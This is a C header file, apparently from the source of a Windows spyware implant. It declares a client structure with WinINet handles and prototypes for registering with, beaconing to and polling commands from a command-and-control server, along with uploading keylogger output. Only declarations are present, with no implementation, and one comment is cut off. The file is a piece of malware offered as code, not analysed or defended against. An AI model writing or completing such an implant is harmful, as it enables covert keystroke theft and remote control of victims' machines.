
#include <windows.h>
#include <wininet.h>

#include "../program/utils.h"
#include "../keylogger/keylogger.h"

#ifndef UTIL_H
#define UTIL_H

#define UNLEN 256
#define MAX_ID_LEN 271 // UNLEN + MAX_COMPUTERNAME_LENGTH

#define MAX_COMMANDS 10

#define PLAIN_TEXT_H "Content-Type: text/plain\r\n"

/**
 * Structure to store information regarding clients
 */
typedef struct {
    char id[MAX_ID_LEN];
    char cmdBuffer[MAX_BUFF_LEN];

    HINTERNET hSession; // internet session
    HINTERNET hConnect; // server connection handle
} CLIENT_HANDLER;

CLIENT_HANDLER* initClient();

RET_CODE registerClient(CLIENT_HANDLER *client, unsigned char* progContextKey);

// functions utilised by the worker threads!
RET_CODE pollCommandsAndBeacon(CLIENT_HANDLER* client); // beacon and recieve commands from the C2
RET_CODE writeKeyLog(CLIENT_HANDLER* client, KEY_LOGGER* kLogger);  // write 

void clientCleanup(CLIENT_HANDLER* client);

#endif // UTIL_H

